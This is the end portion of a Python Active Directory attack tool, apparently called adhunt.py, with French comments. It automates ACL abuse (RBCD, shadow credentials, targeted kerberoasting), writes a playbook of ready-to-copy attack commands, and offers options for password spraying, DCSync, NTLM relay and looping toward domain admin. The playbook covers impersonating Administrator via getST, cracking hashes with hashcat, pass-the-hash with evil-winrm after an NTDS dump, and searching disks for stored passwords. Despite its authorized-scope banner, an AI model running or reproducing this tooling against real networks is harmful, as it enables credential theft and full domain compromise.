        done.add((frm.lower(), to.lower()))
        strong = any(r in rights for r in ("GenericAll", "GenericWrite", "WriteDACL",
                                           "WriteOwner", "AllExtendedRights",
                                           "Write-SPN", "Write-KeyCredentialLink"))
        cred = owned.get(frm.lower())
        if not cred:   # on ne controle pas 'from' -> on documente
            add_finding(state, "HIGH", f"Chemin ACL : {frm} -> {'/'.join(rights)} sur {to}",
                        f"prends le controle de {frm} pour l'exploiter")
            continue
        # on possede 'from' -> on exploite AVEC ses creds (bascule temporaire)
        saved = (args.user, args.password, args.nthash)
        args.user, args.password, args.nthash = cred.get("user"), cred.get("password"), cred.get("hash")
        try:
            if to.endswith("$") and strong:
                abuse_rbcd(args, state, dc, to)
            elif strong:
                abuse_shadow_credentials(args, state, dc, to)   # via ADCS/PKINIT
                targeted_kerberoast(args, state, dc, to)        # alternative sans ADCS
            elif "ForceChangePassword" in rights:
                add_finding(state, "HIGH", f"ForceChangePassword sur {to} (destructif)",
                            f"bloodyAD -u {cred.get('user')} set password {to} 'Newp@ss1!'")
            elif "Self-Membership(AddMember)" in rights:
                add_finding(state, "HIGH", f"AddMember : ajoute-toi au groupe {to}",
                            f"bloodyAD add groupMember {to} {cred.get('user')}")
        finally:
            args.user, args.password, args.nthash = saved

# ======================================================================
# PHASE 5 : RAPPORT
# ======================================================================
SEV_ORDER = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}

# ======================================================================
# PHASE 5 : RAPPORT
# ======================================================================
SEV_ORDER = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}

def build_playbook(state, args):
    """Genere les COMMANDES exactes a executer selon ce que l'outil a trouve
    (ce qu'il n'a pas pu faire lui-meme : outil absent ou etape manuelle/RDP).
    Un scanner ne fait pas tout -> on propose le coup d'apres, pret a copier."""
    dom = state.get("domain") or "<domaine>"
    hosts = state.get("hosts", {})
    dc = first_dc(hosts) or "<dc-ip>"
    dc_fqdn = next((r.get("dns_hostname") for r in hosts.values()
                    if r.get("is_dc") and r.get("dns_hostname")), dc)
    owned = {}
    for c in state.get("creds", []):
        if c.get("user"):
            owned.setdefault(c["user"].lower(), c)
    idf = lambda c: f"-H {c['hash']}" if c.get("hash") else f"-p '{c.get('password')}'"
    pb = []
    # 1) acces avec chaque cred obtenu
    for c in state.get("creds", []):
        pb.append(f"# --- Acces {c['user']} ---")
        pb.append(f"nxc smb {dc} -u '{c['user']}' {idf(c)} -d {dom} --shares")
        pb.append(f"nxc winrm {dc} -u '{c['user']}' {idf(c)} -d {dom}   # WinRM ? -> evil-winrm")
        if c.get("password"):
            pb.append(f"xfreerdp /v:{dc} /u:'{c['user']}' /p:'{c['password']}' /cert:ignore   # RDP")
    # 2) exploitation des chemins ACL (avec le cred du principal 'from')
    for p in state.get("acl_paths", []):
        frm, to, rights = p.get("from", ""), p.get("to", ""), p.get("rights", [])
        c = owned.get(frm.lower())
        if not c:
            pb.append(f"# [ACL] {frm} -> {'/'.join(rights)} -> {to} : obtiens d'abord le cred de {frm}")
            continue
        if to.endswith("$"):   # machine -> RBCD
            pb.append(f"# --- RBCD : {frm} -> {to} ---")
            pb.append(f"addcomputer.py {dom}/'{frm}':'{c.get('password','')}' -computer-name FAKE01$ -computer-pass Fake123! -dc-ip {dc}")
            pb.append(f"rbcd.py {dom}/'{frm}':'{c.get('password','')}' -delegate-from FAKE01$ -delegate-to {to} -action write -dc-ip {dc}")
            pb.append(f"getST.py -spn cifs/{to.rstrip('$')}.{dom} -impersonate Administrator {dom}/FAKE01$:Fake123! -dc-ip {dc}")
        else:                  # user -> targeted kerberoast (ou shadow creds)
            pb.append(f"# --- Targeted Kerberoast : {frm} ({'/'.join(rights)}) -> {to} ---")
            pb.append(f"targetedKerberoast.py -v -d {dom} -u '{frm}' {idf(c)} --dc-host {dc_fqdn} --request-user {to}")
            pb.append(f"hashcat -m 13100 <hash_{to}> /usr/share/wordlists/rockyou.txt   # -> {to}:<pass>")
            pb.append(f"# alt (shadow creds, si ADCS) : certipy shadow auto -u '{frm}@{dom}' {idf(c)} -account {to} -dc-ip {dc}")
    # 3) NTDS dumpe -> Administrator / Golden Ticket
    if state.get("hashes", {}).get("ntds"):
        pb.append("# --- Domaine compromis (NTDS) ---")
        pb.append(f"grep -i 'Administrator:' {state['hashes']['ntds']}")
        pb.append(f"evil-winrm -i {dc} -u Administrator -H <NThash>")
    # 4) chasse de creds SUR LE DISQUE (ce qu'un scanner ne fait pas : RDP/WinRM)
    pb.append("# --- Creds sur le disque (scripts/configs) : via un compte RDP ou WinRM ---")
    pb.append(f"# WinRM : nxc winrm {dc} -u <user> {idf(next(iter(owned.values()), {'password':'<pass>'}))} "
              f"-x \"gci C:\\ -recurse -include *.ps1,*.config,*.xml,*.txt -ea 0 | sls -Pattern 'pass|pwd|cred'\"")
    pb.append(f"# RDP : xfreerdp /v:{dc} /u:<user> /p:<pass> /cert:ignore  ->  dir C:\\Scripts ; type C:\\Scripts\\*.ps1")
    return pb

def phase5_report(state, args):
    stage("PHASE 5 - RAPPORT")
    out_json = os.path.join(args.loot, "report.json")
    with open(out_json, "w", encoding="utf-8") as f:
        json.dump(state, f, indent=2, ensure_ascii=False, default=str)

    findings = sorted(state.get("findings", []), key=lambda x: SEV_ORDER.get(x["sev"], 9))
    hosts = state.get("hosts", {})
    dcs = [ip for ip, r in hosts.items() if r.get("is_dc")]
    lines = []
    lines.append(f"# adhunt - Rapport AD\n")
    lines.append(f"- Cible : `{state.get('target')}`  |  Domaine : `{state.get('domain')}`")
    lines.append(f"- Hotes AD : {len(hosts)}  |  DC : {', '.join(dcs) or 'n/a'}")
    lines.append(f"- Findings : {len(findings)}  |  Creds : {len(state.get('creds', []))}\n")

    lines.append("## Findings (par severite)\n")
    for sev in ("CRIT", "HIGH", "MED", "INFO"):
        fs = [f for f in findings if f["sev"] == sev]
        if not fs:
            continue
        lines.append(f"### {sev} ({len(fs)})")
        for f in fs:
            h = f" _(hote {f['host']})_" if f["host"] else ""
            lines.append(f"- **{f['title']}**{h}" + (f" — {f['detail']}" if f["detail"] else ""))
        lines.append("")

    intel = state.get("ldap_intel")
    if intel:
        lines.append("## Comptes remarquables\n")
        for k, label in (("kerberoastable", "Kerberoastable (SPN)"),
                         ("asreproastable", "AS-REP roastable"),
                         ("admincount", "adminCount=1 (privilegies)"),
                         ("pwd_notreqd", "PASSWD_NOTREQD"),
                         ("unconstrained", "Delegation non contrainte")):
            v = intel.get(k) or []
            if v:
                lines.append(f"- **{label}** : {', '.join(v[:20])}")
        if intel.get("desc_secrets"):
            lines.append(f"- **Descriptions suspectes** : {'; '.join(intel['desc_secrets'][:10])}")
        lines.append("")

    if state.get("creds"):
        lines.append("## Creds trouvees\n")
        for c in state["creds"]:
            lines.append(f"- `{c.get('user')}:{c.get('password') or c.get('hash')}`")
        lines.append("")

    hf = state.get("hashes", {})
    if hf:
        lines.append("## Hashes a cracker\n")
        for k, v in hf.items():
            m = "18200" if k == "asrep" else ("13100" if k == "kerberoast" else "?")
            lines.append(f"- {k} : `{v}`  ->  `hashcat -m {m} {v} rockyou.txt`")
        lines.append("")

    # PLAYBOOK : les commandes exactes a executer (ce que l'outil ne peut pas faire seul)
    pb = build_playbook(state, args)
    lines.append("## PLAYBOOK (commandes a executer)\n")
    lines.append("```bash")
    lines.extend(pb)
    lines.append("```")

    report = "\n".join(lines) + "\n"
    out_md = os.path.join(args.loot, "report.md")
    with open(out_md, "w", encoding="utf-8") as f:
        f.write(report)
    save_loot(args, "playbook.sh", "#!/bin/bash\n# adhunt - commandes proposees (adapte <...>)\n"
              + "\n".join(pb) + "\n")
    log(f"{C.G}[+] Rapport : {out_md}  +  {out_json}  +  playbook.sh{C.X}")
    # apercu console
    ncrit = sum(1 for f in findings if f["sev"] == "CRIT")
    nhigh = sum(1 for f in findings if f["sev"] == "HIGH")
    log(f"{C.CY}{C.BD}[=] {len(findings)} finding(s) : "
        f"{C.R}{ncrit} CRIT{C.CY} / {C.R}{nhigh} HIGH{C.CY} / "
        f"{len(state.get('creds', []))} cred(s){C.X}")
    # PLAYBOOK a l'ecran (les lignes de commande, pas les commentaires)
    cmds = [l for l in pb if l and not l.startswith("#")]
    if cmds:
        log(f"\n{C.CY}{C.BD}[>] PLAYBOOK - prochaines commandes ({len(cmds)}) -> {args.loot}/playbook.sh :{C.X}")
        for l in pb[:30]:
            col = C.GR if l.startswith("#") else C.G
            log(f"    {col}{l}{C.X}")
        if len(pb) > 30:
            log(f"    {C.GR}... (suite dans playbook.sh){C.X}")

def suggest_next(args, state):
    """Propose la commande a lancer a la suite selon l'etat."""
    tgt, dom = state.get("target"), state.get("domain") or "<domaine>"
    dc = first_dc(state.get("hosts", {})) or tgt
    cmd = reason = None
    creds = state.get("creds", [])
    # NTDS dumpe -> connexion Administrator
    if state.get("hashes", {}).get("ntds"):
        cmd = (f"grep -i 'Administrator:' {state['hashes']['ntds']}  "
               f"# puis: evil-winrm -i {dc} -u Administrator -H <NThash>")
        reason = "NTDS dumpe -> recupere le hash Administrator et connecte-toi (pass-the-hash)"
    # creds trouvees mais run non-authentifie -> relancer en --all
    elif creds and not args.all:
        c = creds[0]
        idf = f"-H {c['hash']}" if c.get("hash") else f"-p '{c.get('password')}'"
        cmd = f"python3 adhunt.py {tgt} -d {dom} -u {c['user']} {idf} --all --loop --yes"
        reason = f"cred obtenu ({c['user']}) -> enum authentifiee + escalade en boucle"
    # rien -> seed d'une userlist
    elif not creds and not state.get("users"):
        cmd = f"python3 adhunt.py {tgt} -d {dom} --anon --userlist wordlists/userlist.txt"
        reason = "aucun user -> seed la phase 1 avec une userlist (kerbrute)"
    if cmd:
        state["next_command"] = cmd
        log(f"\n{C.CY}{C.BD}[>] PROCHAINE COMMANDE :{C.X}")
        log(f"    {C.G}{C.BD}{cmd}{C.X}")
        log(f"    {C.GR}-> {reason}{C.X}")

# ----------------------------------------------------------------------
# Cibles : IP, CIDR, hostname, ou fichier
# ----------------------------------------------------------------------
def parse_targets(target):
    if os.path.isfile(target):
        with open(target, encoding="utf-8", errors="ignore") as f:
            items = [l.strip() for l in f if l.strip() and not l.startswith("#")]
        out = []
        for it in items:
            out += parse_targets(it)
        return out
    try:
        net = ipaddress.ip_network(target, strict=False)
        if net.num_addresses > 1:
            return [str(h) for h in net.hosts()]
        return [str(net.network_address)]
    except ValueError:
        pass
    try:
        return [socket.gethostbyname(target)]
    except Exception:
        return [target]

# ----------------------------------------------------------------------
BANNER = f"""{C.CY}{C.BD}
  adhunt.py  -  enumeration Active Directory (tableau de bord vivant){C.X}
{C.GR}  users -> shares -> hashes -> crack -> creds   (escalade: --exploit){C.X}
{C.Y}  by 12akHack{C.GR}  -  tu fournis l'IP du DC (pas de scan nmap ici){C.X}
{C.R}  [!] Usage AUTORISE uniquement : reste STRICTEMENT dans le scope.{C.X}
"""

def detect_env():
    ext = [t for t in ("nxc", "netexec", "crackmapexec", "nmap", "kerbrute",
                        "bloodhound-python", "certipy", "ldapsearch",
                        "GetNPUsers.py", "GetUserSPNs.py", "secretsdump.py",
                        "Get-GPPPassword.py", "GetLAPSPassword.py", "dacledit.py",
                        "targetedKerberoast.py", "badsuccessor.py", "rbcd.py",
                        "enum4linux-ng", "hashcat", "john") if have(t)]
    libs = [l for l in ("ldap3", "impacket") if have_lib(l)]
    return ext, libs

def main():
    p = argparse.ArgumentParser(
        description="adhunt.py - enumeration & pentest Active Directory de A a Z",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
------------------------------------------------------------------------
 GUIDE  (tu as deja fait ton nmap -> donne l'IP du DC)
------------------------------------------------------------------------
 Enum non-auth (users, AS-REP guest, roast+crack) :
    python adhunt.py 10.10.10.10 -d corp.local

 Enum AUTHENTIFIEE complete (LDAP, roast, GPP/LAPS, shares, crack) :
    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Ete2024!'

 Avec un hash NTLM (pass-the-hash) :
    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -H <nthash>

 + ESCALADE offensive (DCSync/ADCS/RBCD/DACL/disk) + boucle jusqu'au DA :
    python adhunt.py 10.10.10.10 -d corp.local -u jdoe -p 'Pass1' --exploit --loop

 Options : --spray (password spray, opt-in), --safe (lecture seule),
           --verbose (montre le detail a l'ecran), -o (dossier de sortie).
 Le detail complet (progression, erreurs) va dans loot/<domaine>/debug.log.

 /!\\ Reste STRICTEMENT dans le scope autorise de l'engagement.
------------------------------------------------------------------------
""")
    p.add_argument("target", nargs="?", help="IP, CIDR, hostname ou fichier de cibles")
    p.add_argument("-d", "--domain", help="Domaine AD (ex: corp.local) - auto-detecte sinon")
    p.add_argument("-u", "--user", help="Utilisateur")
    p.add_argument("-p", "--password", help="Mot de passe")
    p.add_argument("-H", "--hash", dest="nthash", help="Hash NTLM (LM:NT ou NT) - pass-the-hash")
    p.add_argument("-k", "--kerberos", action="store_true", help="Auth Kerberos (ticket/ccache)")
    p.add_argument("--anon", action="store_true", help="Enum non-authentifiee (phase 1)")
    p.add_argument("--spray", action="store_true", help="Password spraying (phase 2)")
    p.add_argument("--all", action="store_true", help="Toutes les phases applicables")
    p.add_argument("--safe", action="store_true", help="Lecture seule : pas de spray ni d'action active")
    p.add_argument("--yes", action="store_true", help="Confirme les actions actives (DCSync, relais, ADCS req)")
    p.add_argument("--loop", action="store_true",
                   help="Boucle : re-enum auth a chaque nouveau cred trouve/cracke (jusqu'au DA)")
    p.add_argument("--relay", action="store_true",
                   help="Tenter coercion + ntlmrelayx (actif, requiert --yes + --lhost)")
    p.add_argument("--lhost", help="IP de l'attaquant (pour le relais NTLM)")
    p.add_argument("--userlist", help="Liste d'utilisateurs a tester (seed phase 1)")
    p.add_argument("--wordlist", help="Wordlist pour le crack auto (defaut: rockyou si present)")
    p.add_argument("--passwordlist", help="Wordlist de mots de passe pour le spray (defaut: liste integree)")
    p.add_argument("--crack-timeout", type=int, default=900, help="Timeout crack hashcat/john (defaut 900s)")
    p.add_argument("--exploit", action="store_true",
                   help="Active l'ESCALADE offensive (DCSync, ADCS/ESC, RBCD/shadow, DACL, disk hunt). "
                        "Sans ce flag : enumeration + roast + crack + affichage SEULEMENT.")
    p.add_argument("--verbose", action="store_true",
                   help="Reaffiche a l'ecran le narratif + les erreurs (sinon dans debug.log)")
    p.add_argument("-t", "--threads", type=int, default=100, help="Threads sonde services (defaut 100)")
    p.add_argument("--timeout", type=float, default=1.2, help="Timeout par service (defaut 1.2s)")
    p.add_argument("-o", "--loot", default="loot", help="Dossier de sortie (defaut loot/)")
    args = p.parse_args()

    print(BANNER)
    if not args.target:
        p.print_help(); sys.exit(0)

    global VERBOSE, DEBUGF, AUDIT
    VERBOSE = args.verbose

    ext, libs = detect_env()
    dbg(f"[i] Outils externes : {', '.join(ext) if ext else 'aucun (fallback pur-python)'}")
    dbg(f"[i] Libs python     : {', '.join(libs) if libs else 'aucune (pip install ldap3 impacket)'}")

    targets = parse_targets(args.target)
    # dossier de sortie base sur le domaine (ou la cible)
    label = re.sub(r"[^\w.-]", "_", args.domain or args.target)
    args.loot = os.path.join(args.loot, label)
    os.makedirs(args.loot, exist_ok=True)
    DEBUGF = open(os.path.join(args.loot, "debug.log"), "a", encoding="utf-8")
    AUDIT = open(os.path.join(args.loot, "audit.log"), "a", encoding="utf-8")
    audit(f"START target={args.target} domain={args.domain} user={args.user} exploit={args.exploit}")
    dbg(f"[i] Cibles : {len(targets)} | sortie : {args.loot}/ | debug.log pour le detail")
    start = time.time()

    state = {"target": args.target, "domain": args.domain, "dc": None, "hosts": {},
             "findings": [], "users": [], "creds": [], "hashes": {},
             "user_rows": [], "share_rows": [], "hash_rows": []}
    BOARD.bind(state)

    # RECON : confirmation des services (PAS de scan nmap - tu fournis l'IP du DC)
    hosts = confirm_services(targets, args, state)
    state["hosts"] = hosts
    state["domain"] = args.domain

    # ENUMERATION NON-AUTH (toujours : users via RID/kerbrute, AS-REP guest, roast+crack)
    phase1_unauth(hosts, args, state)

    # SPRAY : opt-in seulement (risque de lockout), jamais en --safe
    if args.spray and not args.safe:
        phase2_password(hosts, args, state)

    # ENUM AUTHENTIFIEE (si creds fournies -u/-p/-H OU trouvees ci-dessus)
    # -> LDAP dump, roast, GPP/LAPS/gMSA, shares (fouille), crack. Escalade offensive
    #    UNIQUEMENT avec --exploit (sinon on n'affiche que ce qu'on trouve).
    authed = effective_creds(args, state)
    if authed:
        tried = set()
        for it in range(1, 4):                         # max 3 tours de boucle
            tried.add((args.user, args.password or args.nthash))
            before = len(state.get("creds", []))
            phase3_authenum(hosts, args, state)        # enum + roast + crack + shares
            if args.exploit and not args.safe:
                phase4_escalation(hosts, args, state)  # DCSync/ADCS/RBCD/DACL/disk (gate)
            if not args.loop or len(state.get("creds", [])) == before:
                break
            nxt = next((c for c in state["creds"]
                        if (c.get("user"), c.get("password") or c.get("hash")) not in tried), None)
            if not nxt:
                break
            args.user, args.password, args.nthash = nxt.get("user"), nxt.get("password"), nxt.get("hash")
            dbg(f"[BOUCLE] Nouveau cred -> re-enum avec {args.user} (iteration {it+1}).")
    else:
        dbg("[i] Pas de creds (-u/-p ou -H) : enum non-auth uniquement.")

    # RAPPORT (toujours) : redessine le board final puis ecrit le rapport
    BOARD.redraw()
    phase5_report(state, args)
    suggest_next(args, state)

    _raw(f"\n{C.GR}Termine en {time.time()-start:.1f}s | loot: {args.loot}/ "
         f"(detail: debug.log){C.X}")
    audit("END")
    for fh in (AUDIT, DEBUGF):
        try:
            fh and fh.close()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log(f"\n{C.R}[!] Interrompu.{C.X}")
